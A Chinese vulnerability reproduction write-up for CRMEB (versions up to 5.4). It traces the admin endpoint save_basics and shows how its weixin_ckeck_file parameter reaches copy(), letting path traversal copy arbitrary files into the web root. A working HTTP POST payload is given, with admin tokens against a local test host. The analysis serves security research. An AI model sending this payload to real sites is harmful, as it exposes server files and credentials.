## 环境搭建

漏洞版本影响 <=5.4

```php
git clone https://github.com/crmeb/CRMEB.git
```

![image-20241230204422170](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202412302044215.png)

这里伪静态要编辑

```php
location / {
    if (!-e $request_filename) {
        rewrite  ^(.*)$  /index.php?s=/$1  last;
        break;
    }
}
```

## 漏洞复现

漏洞存在路由：

![image-20241230205429694](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202412302054753.png)

跟踪到`\app\adminapi\controller\v1\setting\SystemConfig::save_basics`

![image-20241230210057997](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202412302100044.png)

这一部分是遍历数组取参数的。跟进到`$post = $this->request->post();`

![image-20241230210213045](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202412302102084.png)

然后进入到`	return $this->only($name, $this->post, $filter);`

![image-20241230210332061](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202412302103113.png)

将传入的参数循环复制为数组。然后回到`\app\adminapi\controller\v1\setting\SystemConfig::save_basics`
![image-20241230210430221](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202412302104271.png)

下面就是根据匹配到的参数进行相应的操作，这里如果检测到`weixin_ckeck_file`那么就进入了内层，这里有一个`copy`函数，可以进行文件复制操作。然后看`$from`和`$to`; 这里跟进到`public_path()`他就是获去public的路径，也就是我们搭建网站的根路径，然后将`weixin_ckeck_file`拼接到后边，再看`$to`,它以`/`分割为数组，然后使用了一个数组逆序然后取第一个元素，太好啦，这里我们就能控制要复制的文件然后将文件复制到public目录下。构造payload

```c
POST /adminapi/setting/config/save_basics?XDEBUG_SESSION_START=12261 HTTP/1.1
Host: 127.0.0.1:89
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Authori-zation: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwd2QiOiJkNWUxNjFlNDhiN2JjYTM0NTk1MGU3NTM0MDdlYTgxOCIsImlzcyI6IjEyNy4wLjAuMTo4OSIsImF1ZCI6IjEyNy4wLjAuMTo4OSIsImlhdCI6MTczNTU2MTc4MCwibmJmIjoxNzM1NTYxNzgwLCJleHAiOjE3MzgxNTM3ODAsImp0aSI6eyJpZCI6MSwidHlwZSI6ImFkbWluIn19.IbCGEX_33vnfH3LC05OmfKRG0EkCpFpYjxrGmfHtjlg
Connection: close
Referer: http://127.0.0.1:89/admin/user/list
Cookie: cb_lang=zh-cn; PHPSESSID=f2bff51ad1cf4d38f6b56e4286741507; WS_ADMIN_URL=ws://127.0.0.1:89/notice; WS_CHAT_URL=ws://127.0.0.1:89/msg; uuid=1; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwd2QiOiJkNWUxNjFlNDhiN2JjYTM0NTk1MGU3NTM0MDdlYTgxOCIsImlzcyI6IjEyNy4wLjAuMTo4OSIsImF1ZCI6IjEyNy4wLjAuMTo4OSIsImlhdCI6MTczNTU2MTc4MCwibmJmIjoxNzM1NTYxNzgwLCJleHAiOjE3MzgxNTM3ODAsImp0aSI6eyJpZCI6MSwidHlwZSI6ImFkbWluIn19.IbCGEX_33vnfH3LC05OmfKRG0EkCpFpYjxrGmfHtjlg; expires_time=1738153780
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Content-Type: application/json;charset=utf-8
Content-Length: 68

{
    "weixin_ckeck_file": "../../../../../../../../../flag.txt"
}
```

## 调试分析

![image-20241230211353439](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202412302113529.png)

前面数组遍历就不截图了，自己调调就能明白其中的道理了。

![image-20241230211752799](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202412302117911.png)

成功copy文件成功
![image-20241230211821061](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202412302118101.png)